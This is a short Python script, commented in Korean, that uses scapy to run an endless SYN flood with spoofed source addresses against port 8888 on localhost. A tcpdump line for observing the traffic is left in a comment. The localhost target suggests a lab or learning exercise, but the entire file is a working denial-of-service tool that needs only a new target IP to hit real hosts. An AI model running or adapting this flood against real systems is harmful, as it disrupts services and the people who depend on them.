from scapy.all import *
import random
import time

target_ip = "127.0.0.1"
target_port = 8888

while True:
    src_port = random.randint(1024, 65535)
    seq = random.randint(1000, 9000)
    spoofed_ip = f"127.0.0.{random.randint(2, 254)}"

    # ip 헤더
    ip = IP(src=spoofed_ip, dst=target_ip)
    # SYN 플래그 설정
    tcp = TCP(sport=src_port, dport=target_port, flags='S', seq=seq)

    # 패킷 조립
    pkt = ip/tcp
    send(pkt, verbose=0)

    time.sleep(0.01)  # 속도 조절

# sudo tcpdump -i lo0 tcp port 8888